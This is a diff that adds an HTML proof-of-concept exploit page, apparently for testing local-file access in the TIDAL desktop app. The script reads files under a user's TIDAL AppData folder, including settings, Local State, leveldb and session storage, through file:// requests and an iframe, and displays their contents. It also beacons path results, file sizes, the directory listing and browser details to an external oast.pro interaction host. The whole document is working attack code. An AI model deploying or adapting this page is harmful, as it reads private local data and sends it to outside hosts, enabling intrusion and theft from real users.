@@ -1,0 +1,129 @@
+<html>
+<body>
+<script>
+(async function() {
+  // ----- Helper: read local file via XHR -----
+  function xhrRead(url) {
+    return new Promise((resolve, reject) => {
+      const x = new XMLHttpRequest();
+      x.open('GET', url);
+      x.onload = () => resolve(x.responseText);
+      x.onerror = () => reject('failed');
+      x.send();
+    });
+  }
+
+  // ----- Non‑sensitive pingback (to your collaborator) -----
+  const PINGBACK_URL = 'https://48003a0a0673a30bd409guidijyyyyyyn.oast.pro';
+  
+  // Collect metadata (no file contents, only status + safe info)
+  const pingbackData = {
+    event: 'local_file_scan',
+    timestamp: Date.now(),
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    results: []
+  };
+
+  // ----- The sensitive file paths (as in original) -----
+  const paths = [
+    'file:///C:/Users/bob%20bob/AppData/Roaming/TIDAL/Logs/',
+    'file:///C:/Users/bob%20bob/AppData/Roaming/TIDAL/settings',
+    'file:///C:/Users/bob%20bob/AppData/Roaming/TIDAL/Local%20State',
+    'file:///C:/Users/bob%20bob/AppData/Roaming/TIDAL/Preferences',
+    'file:///C:/Users/bob%20bob/AppData/Roaming/TIDAL/Local%20Storage/leveldb/',
+    'file:///C:/Users/bob%20bob/AppData/Roaming/TIDAL/Session%20Storage/',
+  ];
+
+  // ----- Scan each path: display sensitive content locally + collect safe metadata -----
+  for (const p of paths) {
+    try {
+      const content = await xhrRead(p);
+      // Display sensitive content (first 500 chars) ONLY on the page
+      document.write('<h3 style="color:green">✓ SUCCESS: ' + p + '</h3>');
+      document.write('<pre style="background:#eee;padding:10px">' +
+        content.substring(0, 500) + '</pre>');
+      
+      // For pingback: store only safe metadata (no content)
+      pingbackData.results.push({
+        path: p,
+        status: 'success',
+        sizeBytes: content.length,
+        // optionally, first 10 chars of NON‑sensitive files? 
+        // We'll keep it empty to be safe – only metadata
+        preview: ''  
+      });
+    } catch(e) {
+      document.write('<span style="color:red">✗ ' + p + '</span><br>');
+      pingbackData.results.push({
+        path: p,
+        status: 'failed',
+        error: 'xhr read failed'
+      });
+    }
+  }
+
+  // ----- Also try iframe directory listing (may show file names, non‑sensitive) -----
+  document.write('<h3>iframe directory test</h3>');
+  const iframe = document.createElement('iframe');
+  iframe.style.width = '100%';
+  iframe.style.height = '300px';
+  iframe.src = 'file:///C:/Users/bob%20bob/AppData/Roaming/TIDAL/Logs/';
+  
+  // We'll also capture the directory listing (file names) for pingback, if possible
+  let directoryListing = '';
+  iframe.onload = function() {
+    try {
+      const content = iframe.contentDocument.body.innerText;
+      directoryListing = content.substring(0, 500);
+      document.write('<pre>' + directoryListing + '</pre>');
+      
+      // Add directory names to pingback (non‑sensitive)
+      pingbackData.directoryListing = directoryListing;
+      // Send pingback now that we have all data
+      sendPingback();
+    } catch(e) {
+      document.write('iframe cross-origin blocked: ' + e.message);
+      pingbackData.iframeError = e.message;
+      sendPingback();
+    }
+  };
+  document.body.appendChild(iframe);
+
+  // If iframe never triggers onload (e.g., blocked immediately), send after a timeout
+  setTimeout(() => {
+    if (!pingbackData.sent) sendPingback();
+  }, 3000);
+
+  async function sendPingback() {
+    if (pingbackData.sent) return;
+    pingbackData.sent = true;
+    
+    // Try POST with no‑cors (fire and forget)
+    try {
+      await fetch(PINGBACK_URL, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(pingbackData)
+      });
+    } catch (err) {
+      // Fallback: image beacon (GET)
+      const img = new Image();
+      img.src = PINGBACK_URL + '?data=' + encodeURIComponent(JSON.stringify(pingbackData).slice(0, 2000));
+    }
+  }
+
+  // Also send an initial pingback even if iframe fails fast
+  // But we wait for iframe; if it errors quickly, onerror will call sendPingback?
+  // Actually onload may not fire for cross-origin iframes? Better to have a backup.
+  // We'll call sendPingback after all file reads (but iframe may still be pending)
+  // So we'll call it after a delay independent of iframe.
+  setTimeout(() => {
+    if (!pingbackData.sent) sendPingback();
+  }, 2000);
+})();
+</script>
+</body>
+</html>
